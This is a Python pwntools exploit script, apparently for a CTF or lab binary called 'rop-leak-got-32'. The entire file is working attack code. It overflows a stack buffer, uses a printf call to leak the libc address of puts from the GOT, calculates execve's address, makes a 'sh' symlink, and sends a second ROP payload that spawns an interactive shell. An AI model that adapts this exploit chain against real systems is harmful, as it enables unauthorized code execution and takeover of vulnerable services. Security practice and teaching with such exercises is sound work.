#!/usr/bin/env python

from pwn import *

p = process("./rop-leak-got-32")

e = ELF('/lib32/libc.so.6')
puts_offset = e.symbols['puts']
execve_offset = e.symbols['execve']

offset_diff = execve_offset - puts_offset

input_func = p.elf.symbols['input_func']
printf_func = p.elf.symbols['printf']
strcpy_func = p.elf.symbols['strcpy']

print p.recvline()

puts_got = 0x0804a014

template = "A" * 0x88 + "BBBB"

payload = template

payload += p32(printf_func) + p32(input_func) + p32(puts_got)

p.send(payload)

print p.recvline()
print p.recvline()

data = p.recv(0x100)

libc_puts = u32(data[0:4])
print(hex(libc_puts))
print(hex(puts_offset))
libc_execve = libc_puts + offset_diff

payload = template
payload += p32(libc_execve) + p32(0) + p32(0x804856c) + p32(0) + p32(0)

import os
if not os.path.exists("\xb8"):
    os.symlink("sh", "\xb8")

with open('exploit.txt', 'wb') as f:
    f.write(payload)

p.send(payload)
p.interactive()
